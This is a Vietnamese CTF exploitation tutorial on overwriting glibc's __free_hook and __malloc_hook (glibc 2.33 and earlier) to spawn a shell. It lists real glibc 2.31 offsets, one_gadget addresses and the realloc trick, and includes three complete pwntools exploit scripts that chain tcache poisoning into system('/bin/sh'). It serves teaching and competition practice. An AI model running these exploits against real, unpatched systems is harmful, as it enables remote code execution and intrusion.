PWN · Phase 4 · Bài 22

Hook Overwrite

Đích "cổ điển" của heap trên glibc cũ (≤ 2.33): ghi đè con trỏ hàm __malloc_hook / __free_hook trong libc → lần malloc/free kế gọi vào hàm bạn chọn (system hoặc one-gadget). Bài này đi offset thật glibc 2.31: __free_hook=+0x1eee48, system=+0x52290. Đơn giản nhưng đã bị gỡ từ glibc 2.34.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Hook là gì: glibc (cũ) có biến con trỏ hàm __malloc_hook, __free_hook. Nếu khác NULL, malloc/free gọi hook trước. Vốn để debug — thành cửa hậu khi bạn ghi được chúng.

Khai thác: có ghi tùy ý (từ poisoning) + leak libc → ghi __free_hook = system, rồi free(chunk chứa "/bin/sh") → system("/bin/sh"). Hoặc __malloc_hook = one_gadget.

Hết thời: glibc ≥ 2.34 bỏ hook. Khi đó dùng FSOP / exit handler / apple2.

Nếu chỉ nhớ một điều: __free_hook = system → free("/bin/sh"). Chỉ áp dụng glibc ≤ 2.33.

⚡ COMBAT CARD — dán chạy khi đang thi
🚦 Dùng khi

glibc ≤ 2.33 (check version!) + có ghi tùy ý vào libc (poisoning/largebin/arbitrary write) + leak libc.

🔢 Offset thật 2.31 (Ubuntu 20.04) 
system       = libc + 0x52290
__free_hook  = libc + 0x1eee48
__malloc_hook= libc + 0x1ecb70
/bin/sh      = libc + 0x1b45bd
one_gadget   = libc + 0xe3afe / 0xe3b01 / 0xe3b04
✅ Cách 1: free_hook = system (ổn nhất) 
write(libc.sym.__free_hook, libc.sym.system)
free(chunk_binsh)   # chunk chứa "/bin/sh\0" → system("/bin/sh")
✅ Cách 2: malloc_hook = one_gadget 
write(libc.sym.__malloc_hook, libc.address + 0xe3b01)
malloc(bất_kỳ)      # gọi one_gadget → shell (nếu thỏa constraint)
⚠️ Lưu ý

free_hook nhận arg = con trỏ chunk (dễ làm "/bin/sh"); malloc_hook nhận size (khó) → ghép one_gadget. one_gadget có constraint (rsp&0xf==0...) — thử nhiều. ≥2.34 KHÔNG còn hook.

01 / NỀN TẢNG BẮT BUỘC

Hook của malloc

glibc để lại cơ chế gắn "hàm thay thế" cho allocator (phục vụ debug/profiling): các biến toàn cục trong libc là con trỏ hàm.

// trong libc (glibc ≤2.33)
void *(*__malloc_hook)(size_t, const void*);
void  (*__free_hook)(void*, const void*);
// malloc(n):  if(__malloc_hook) return __malloc_hook(n, RET_ADDR);
// free(p):    if(__free_hook)   return __free_hook(p, RET_ADDR);

Định nghĩa nhanh

__free_hook

Con trỏ hàm gọi khi free(p); nhận p (con trỏ data) làm đối số đầu → rdi.

__malloc_hook

Gọi khi malloc(n); nhận size n → rdi.

one_gadget

Một địa chỉ trong libc, nhảy tới là execve("/bin/sh") — kèm ràng buộc.

arbitrary write

Ghi giá trị vào địa chỉ tùy ý (từ poisoning…).

Version is everything./libc.so.6 chạy trực tiếp in version, hoặc strings libc.so.6 | grep "GNU C". 2.34 trở lên: không còn __malloc/free_hook (libc.sym.__free_hook = None) — bài này vô dụng, chuyển FSOP.
02 / VÌ SAO CÓ KỸ THUẬT

Cửa hậu hợp pháp của libc

Hook là tính năng gỡ lỗi: cho phép thay allocator lúc chạy. Nhưng nó là con trỏ hàm nằm trong vùng data ghi được của libc, và được gọi mỗi lần malloc/free. Với attacker có "ghi tùy ý", đây là đích RCE ngắn nhất: một lần ghi → một lần trigger → shell. Suốt nhiều năm, "ghi __free_hook = system" là bước kết của gần như mọi đề heap. glibc 2.34 gỡ bỏ chính vì lý do đó, đẩy meta sang FSOP.

04 / ONE-GADGET

Khi dùng __malloc_hook

free_hook tiện vì đối số là con trỏ. malloc_hook nhận size (số), khó biến thành "/bin/sh", nên thường ghép one_gadget — một địa chỉ trong libc mà nhảy tới sẽ execve("/bin/sh", NULL, NULL), với điều kiện (constraint) về thanh ghi/stack.

$ one_gadget ./libc-2.31.so
# 0xe3afe  execve("/bin/sh", r15, r12)   constraints: [r15]==NULL || r15==NULL ...
# 0xe3b01  execve("/bin/sh", r15, rdx)    constraints: [r15]==NULL || ...
# 0xe3b04  execve("/bin/sh", rsi, rdx)    constraints: [rsi]==NULL || ...
# → thử lần lượt tới khi thỏa (tại thời điểm malloc gọi hook)
Mẹo trigger malloc_hookNhiều đề không cho malloc trực tiếp sau khi ghi → trigger gián tiếp: printf("%10000c") (glibc malloc buffer lớn), scanf field dài, hoặc dùng free_hook cho chắc.
realloc hook trickNếu one_gadget nào cũng không thỏa khi gọi từ malloc_hook: đặt __malloc_hook = &realloc+offset (một push/mov dịch stack) và __realloc_hook = one_gadget để chỉnh rsp cho thỏa constraint (kinh điển glibc 2.27–2.31).

07 / EXPLOIT ĐẦY ĐỦ — POISONING → __free_hook → SHELL

Nối tiếp bài poisoning (glibc 2.31)

Đã leak libc, đã ép malloc trả về &__free_hook (= base+0x1eee48). Giờ ghi system & trigger.

# BẢN A — glibc 2.31. Poisoning tcache về __free_hook rồi ghi system.
from pwn import *
exe  = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)
# ... alloc/free/edit/show ...

# 1) leak libc (unsorted): base = leak - 0x1ecbe0
alloc(0,0x4f8); alloc(1,0x18); free(0)
libc.address = u64(show(0)[:8].ljust(8,b"\x00")) - 0x1ecbe0
log.success(f"libc={hex(libc.address)}  __free_hook={hex(libc.sym.__free_hook)}")

# 2) tcache poisoning: fd → __free_hook (2.31 fd thô)
alloc(2,0x40); free(2)
edit(2, p64(libc.sym.__free_hook))     # = base+0x1eee48
alloc(3,0x40); alloc(4,0x40)      # chunk4 == &__free_hook

# 3) ghi system
edit(4, p64(libc.sym.system))         # __free_hook = base+0x52290

# 4) chuẩn bị "/bin/sh" & trigger
alloc(5,0x20,b"/bin/sh\x00"); free(5)   # free(p5) → system("/bin/sh")
p.interactive()
Thành thật phiên bảnglibc ≥2.32: thêm safe-linking cho fd (xem poisoning). glibc ≥2.34: KHÔNG có __free_hook → đoạn này abort, chuyển FSOP.
# BẢN B — pwntools. one_gadget cho malloc_hook nếu không có free tiện lợi.
from pwn import *
context.binary = exe = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)
# ... leak libc = ... - 0x1ecbe0 ...
# cách free_hook (ưu tiên):
arb_write(libc.sym.__free_hook, libc.sym.system)
alloc(9,0x20,b"/bin/sh\x00"); free(9)
# hoặc one_gadget qua malloc_hook:
# og = libc.address + 0xe3b01
# arb_write(libc.sym.__malloc_hook, og); malloc(1)  # trigger
p.interactive()
MẹoLuôn thử free_hook trước (không ràng buộc). one_gadget chỉ khi buộc phải qua malloc_hook. Thử cả 3 gadget 0xe3afe/0xe3b01/0xe3b04.
# BẢN C — pwnld.
from pwnld import *
context.binary = exe = ELF("./chall", checksec=False); libc = get_libc("./libc.so.6")
p = start(); GDB(); m = Menu(prompt=b">")
# ... rebase_libc(leak, 0x1ecbe0) ...
m.alloc(0,0x40); m.free(0)
m.edit(0, p64(protect_ptr(chunk0, LIBC.sym.__free_hook)))  # safe-link nếu ≥2.32
m.alloc(1,0x40); m.alloc(2,0x40); m.edit(2, p64(LIBC.sym.system))
m.alloc(3,0x20,b"/bin/sh\x00"); m.free(3); ia()
pwnldone_gadget(LIBC.path) list gadget; protect_ptr cho safe-linking. free_hook vẫn là đường chắc nhất.

09 / GỠ LỖI

Khi không ra shell

glibc ≥2.34

Không còn hook. Mọi nỗ lực vô ích → FSOP/exit handler.

one_gadget không thỏa

Constraint sai (rsp, regs). Thử gadget khác hoặc realloc trick.

Quên "/bin/sh" trong chunk

free_hook=system nhưng arg không phải "/bin/sh" → system(rác).

Trigger sai hook

Ghi malloc_hook nhưng chỉ free → không gọi. Khớp hook với thao tác trigger.

Safe-linking bỏ qua

≥2.32 poisoning cần mã hóa fd (xem bài poisoning).

Leak libc sai

Offset hook sai theo base. Kiểm base kết thúc 000.

11 / LUYỆN TẬP

Bài tập tăng dần

⭐⭐ · free_hook = system

glibc 2.27/2.31: UAF/poisoning ghi __free_hook=system, free chunk "/bin/sh" → shell.

⭐⭐⭐ · malloc_hook = one_gadget

Chỉ có malloc: ghi __malloc_hook=one_gadget, thử từng gadget (0xe3afe/0xe3b01/0xe3b04) tới khi thỏa.

⭐⭐⭐⭐ · realloc trick

Khi one_gadget không thỏa trực tiếp: dùng cặp malloc_hook/realloc_hook để chỉnh stack.

12 / THUẬT NGỮ & ĐỌC THÊM

Tra cứu nhanh

__free_hook

Hook gọi khi free(p); arg=p (→rdi). 2.31: +0x1eee48.

__malloc_hook

Hook gọi khi malloc(n); arg=n. 2.31: +0x1ecb70.

one_gadget

constraint

Dịch stack để thỏa one_gadget.
